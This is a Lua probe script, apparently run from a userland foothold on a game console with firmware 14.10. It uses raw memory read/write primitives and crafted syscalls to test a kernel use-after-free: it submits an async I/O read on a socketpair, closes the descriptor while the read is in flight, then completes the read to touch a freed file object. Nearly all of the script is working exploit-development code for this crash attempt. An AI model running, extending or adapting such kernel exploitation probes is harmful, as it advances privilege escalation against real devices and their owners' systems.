-- CRASH_CLASS: HIGH
-- PROBE 775a: close the fd while an aio read is still in flight
--
-- Block-mode creates really submit I/O on 14.10 (744b/747a): a read on a
-- socketpair stays at state 2 until the peer is written. If the job keeps the
-- raw fd number instead of a file reference, closing the fd and then
-- completing the read touches a freed file/socket. That is the classic
-- in-flight close shape and has never been tested here.
print("=== PROBE 775a: AIO CLOSE IN FLIGHT ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=to_num(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function call(sc,a1,a2,a3,a4,a5,a6)
    local ok,r=pcall(function() return sc(U(a1),U(a2),U(a3),U(a4),U(a5),U(a6)) end)
    if not ok then return "DEAD" end
    return to_num(r)
end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-8,8 do memory.write_qword(a+i,0) end end) end
local D=to_num(memory.alloc(0x400)); local buf=to_num(memory.alloc(0x1000))
local res=to_num(memory.alloc(0x100)); local ids=to_num(memory.alloc(0x40))
local st=to_num(memory.alloc(0x40)); local fds=to_num(memory.alloc(0x20))
local function pair()
    zero(fds,0x20); wd(fds,0xFFFF); wd(fds+4,0xFFFF)
    local r=call(mk(135),1,1,0,fds,0,0)
    local s0,s1=rd(fds),rd(fds+4)
    if type(s0)~="number" or s0<=0 or s0==0xFFFF then return nil end
    return s0,s1
end
local function create(fd,len,bufp,resp)
    zero(D,0x400); zero(st,0x40)
    wq(D+0x00,0); wq(D+0x08,len); wq(D+0x10,bufp); wq(D+0x18,resp)
    wd(D+0x20,fd); wd(D+0x24,0)
    local r=call(mk(669),0x1001,D,1,1,st,0)
    return r, rd(st)
end
local function poll(id)
    zero(res,0x100); wd(ids,id)
    local r=call(mk(664),ids,1,res,0,0,0)
    return r, rd(res)
end
local function del(id)
    zero(res,0x100); wd(ids,id)
    local r=call(mk(662),ids,1,res,0,0,0)
    return r, rd(res)
end
-- [B] control: in-flight read, peer written, never closed
local s0,s1=pair()
print(string.format("[A] pair s0=%s s1=%s",tostring(s0),tostring(s1)))
if not s0 then print("[A] no socketpair") return end
zero(buf,0x1000)
local r,id=create(s0,16,buf,res)
local pb,sb=poll(id)
print(string.format("[B] control create=%s id=%08X pollret=%s state=%08X",tostring(r),id or 0,tostring(pb),sb))
local wb=call(mk(4),s1,buf,U(16),0,0,0)
local pc,sc2=poll(id)
local dc,dcs=del(id)
print(string.format("[B] write=%s pollret=%s state=%08X delret=%s delst=%08X alive=%s",tostring(wb),tostring(pc),sc2,tostring(dc),dcs,tostring(call(mk(20),0,0,0,0,0,0))))
-- [A] in-flight read, fd closed, then peer written
local t0,t1=pair()
zero(buf,0x1000)
local r2,id2=create(t0,16,buf,res)
local pa,sa=poll(id2)
print(string.format("[A] create=%s id=%08X pollret=%s state=%08X",tostring(r2),id2 or 0,tostring(pa),sa))
print("[A] close(t0)="..tostring(call(mk(6),t0,0,0,0,0,0)))
print(string.format("[A] write peer=%s",tostring(call(mk(4),t1,buf,U(16),0,0,0))))
local pa2,sa2=poll(id2)
local da,das=del(id2)
print(string.format("[A] pollret=%s state=%08X delret=%s delst=%08X alive=%s",tostring(pa2),sa2,tostring(da),das,tostring(call(mk(20),0,0,0,0,0,0))))
-- [C] both ends closed before completion
local u0,u1=pair()
zero(buf,0x1000)
local r3,id3=create(u0,16,buf,res)
print(string.format("[C] create=%s id=%08X poll=%s",tostring(r3),id3 or 0,tostring(poll(id3))))
print(string.format("[C] close both: %s %s",tostring(call(mk(6),u0,0,0,0,0,0)),tostring(call(mk(6),u1,0,0,0,0,0))))
local pc3,sc3=poll(id3)
local dc3,dcs3=del(id3)
print(string.format("[C] pollret=%s state=%08X delret=%s delst=%08X alive=%s",tostring(pc3),sc3,tostring(dc3),dcs3,tostring(call(mk(20),0,0,0,0,0,0))))
print("=== 775a DONE ===")
